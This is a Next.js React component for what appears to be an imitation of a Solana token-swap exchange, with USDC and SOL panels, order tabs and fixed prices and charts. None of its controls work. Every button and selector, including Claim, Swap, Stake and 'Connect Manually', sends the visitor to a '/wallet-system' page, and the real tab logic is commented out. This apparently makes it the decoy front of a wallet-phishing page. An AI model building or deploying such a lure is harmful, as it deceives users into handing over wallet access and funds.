"use client"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Search, Rocket, ChevronDown, Settings, ExternalLink, Sparkles, SlidersHorizontal, RotateCw, ArrowDownUp, Eye } from "lucide-react"

export default function DeFiTradingPlatform() {
  const [activeTab, setActiveTab] = useState("instant")
  const router = useRouter()

  // Handler for all buttons
  const goToWalletSystem = () => {
    router.push("/wallet-system")
  }

  return (
    <div
      style={{
        backgroundImage: 'url("/background.webp")',
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
        backgroundAttachment: "fixed",
        minHeight: "100vh",
      }}
    >
      {/* Navigation Header */}
      <nav className="flex items-center justify-between p-4 border-b border-border/20 bg-black">
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-transparent rounded-full flex items-center justify-center">
            <img src="/logo.webp" alt="Logo" className="w-6 h-6" />
          </div>
        </div>

        <div className="flex-1 max-w-md mx-8">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
            <Input className="pl-10 bg-card border-border/50 text-card-foreground rounded-full" />
          </div>
        </div>

        <Button className="bg-primary text-primary-foreground hover:bg-primary/90" onClick={goToWalletSystem}>Connect</Button>
      </nav>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-xl mx-auto">
          {/* Tab Navigation */}
          <div className="flex rounded-lg p-1 mb-2">
            {["instant", "trigger", "recurring"].map((tab) => (
              <button
                key={tab}
                // onClick={() => setActiveTab(tab)}
                onClick={goToWalletSystem}
                className={`flex-1 py-2 px-4 rounded-full text-sm font-medium transition-colors ${activeTab === tab
                  ? "bg-primary/10 text-white"
                  : "text-muted-foreground hover:text-foreground"
                  }`}
              >
                {tab === "instant" ? "🚀" : tab === "trigger" ? "🔔" : "♻️"} {tab.charAt(0).toUpperCase() + tab.slice(1)}
              </button>
            ))}
          </div>
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2 border p-2 rounded-full" onClick={goToWalletSystem}>
              <Sparkles className="w-4 h-4 text-muted-foreground" />
              <span className="text-sm font-medium">Ultra v2</span>
              <SlidersHorizontal className="w-4 h-4 text-muted-foreground" />
            </div>
            <RotateCw className="w-6 h-6 text-muted-foreground border rounded-full p-1 " onClick={goToWalletSystem} />
          </div>
          {/* Trading Interface */}
          <div className="mb-2">
            {/* Selling Section */}
            <div className="bg-card border rounded-xl p-4">
              <div className="text-xs text-muted-foreground mb-2">Selling</div>
              <div className="bg-muted rounded-lg">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2 bg-gray-700 rounded-lg px-2 py-1" onClick={goToWalletSystem}>
                    <div className="w-8 h-8 bg-[#1a1a1a] rounded-full flex items-center justify-center">
                      <img src="/usdc.svg" alt="USDC" className="w-5 h-5" />
                    </div>
                    <span className="font-medium text-base">USDC</span>
                    <ChevronDown className="w-4 h-4 text-muted-foreground" />
                  </div>
                  <div className="text-right">
                    <div className="text-2xl font-bold tracking-wider">0.00</div>
                    <div className="text-xs text-muted-foreground">$0</div>
                  </div>
                </div>
              </div>
            </div>

            {/* Center Swap Icon */}
            <div className="flex justify-center items-center -my-3">
              <div className="w-8 h-8 bg-[#181c20] border-2 border-[#23272f] rounded-full flex items-center justify-center z-10">
                <ArrowDownUp className="w-4 h-4 text-muted-foreground" />
              </div>
            </div>

            {/* Buying Section */}
            <div className="bg-card border rounded-xl p-4">
              <div className="text-xs text-muted-foreground mb-2">Buying</div>
              <div className="bg-muted rounded-lg">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2 bg-gray-700 rounded-lg px-2 py-1" onClick={goToWalletSystem}>
                    <div className="w-8 h-8 bg-[#1a1a1a] rounded-full flex items-center justify-center">
                      <img src="/sol.svg" alt="SOL" className="w-5 h-5" />
                    </div>
                    <span className="font-medium text-base">SOL</span>
                    <ChevronDown className="w-4 h-4 text-muted-foreground" />
                  </div>
                  <div className="text-right">
                    <div className="text-2xl font-bold tracking-wider">0.00</div>
                    <div className="text-xs text-muted-foreground">$0</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="bg-transparent mb-4">
            {/* Action Buttons */}
            <div className="space-y-3">
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>
                Connect Wallet
              </Button>
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>
                Claim
              </Button>
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>Buy</Button>
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>
                Stake / Unstake
              </Button>
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>
                Swap
              </Button>
              <Button className="w-full bg-primary text-primary-foreground hover:bg-primary/90 text-lg" onClick={goToWalletSystem}>
                Connect Manually
              </Button>
            </div>
          </div>

          {/* Chart Section */}
          <div className="flex items-center gap-4 mb-4">
            <div className="flex items-center gap-2 bg-gray-700 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show Chart</span>
              <Eye className="w-4 h-4" />
            </div>
            <div className="flex items-center gap-2 bg-gray-700 px-2 py-1 rounded-full">
              <span className="text-sm text-muted-foreground">Show History</span>
              <Eye className="w-4 h-4" />
            </div>
          </div>

          {/* Price Charts */}
          <div className="grid grid-cols-2 gap-4">
            {/* USDC Card */}
            <Card className="bg-[#181e29] border-none shadow-none p-4">
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-center gap-2">
                  <div className="size-6 bg-[#232b3a] rounded-full flex items-center justify-center">
                    <img src="/usdc.svg" alt="USDC" className="size-6" />
                  </div>
                  <div>
                    <div className="text-base font-semibold text-white leading-tight">USDC</div>
                    <div className="text-xs text-[#a3adc2] leading-tight tracking-wide">EPjF...Dt1v</div>
                  </div>
                </div>
                <div className="flex flex-col items-end">
                  <span className="text-base font-semibold text-white leading-tight">$0.99985</span>
                  <span className="text-xs text-[#ff4d6d] leading-tight">-0.01%</span>
                </div>
              </div>
              {/* Mini Chart */}
              <div className="h-6 flex items-end justify-center mb-2">
                <svg width="180" height="48" className="">
                  <polyline
                    fill="none"
                    stroke="#ff4d6d"
                    strokeWidth="2"
                    points="0,40 10,30 20,35 30,25 40,30 50,20 60,28 70,18 80,25 90,20 100,30 110,25 120,35 130,30 140,40 150,35 160,38 170,42 180,40"
                  />
                </svg>
              </div>
              <div className="flex items-center gap-1 text-[#a3adc2] text-sm mt-1">
                <span>Open Page</span>
                <ExternalLink className="w-4 h-4" />
              </div>
            </Card>
            {/* SOL Card */}
            <Card className="bg-[#181e29] border-none shadow-none p-4">
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-center gap-2">
                  <div className="size-6 bg-[#232b3a] rounded-full flex items-center justify-center">
                    <img src="/sol.svg" alt="SOL" className="size-4" />
                  </div>
                  <div>
                    <div className="text-base font-semibold text-white leading-tight">SOL</div>
                    <div className="text-xs text-[#a3adc2] leading-tight tracking-wide">So1l...1112</div>
                  </div>
                </div>
                <div className="flex flex-col items-end">
                  <span className="text-base font-semibold text-white leading-tight">$170.43</span>
                  <span className="text-xs text-[#ff4d6d] leading-tight">-1.41%</span>
                </div>
              </div>
              {/* Mini Chart */}
              <div className="h-6 flex items-end justify-center mb-2">
                <svg width="180" height="48" className="">
                  <polyline
                    fill="none"
                    stroke="#ff4d6d"
                    strokeWidth="2"
                    points="0,40 10,20 20,25 30,18 40,22 50,15 60,20 70,18 80,25 90,20 100,30 110,25 120,35 130,30 140,40 150,35 160,38 170,42 180,40"
                  />
                </svg>
              </div>
              <div className="flex items-center gap-1 text-[#a3adc2] text-sm mt-1">
                <span>Open Page</span>
                <ExternalLink className="w-4 h-4" />
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div >
  )
}
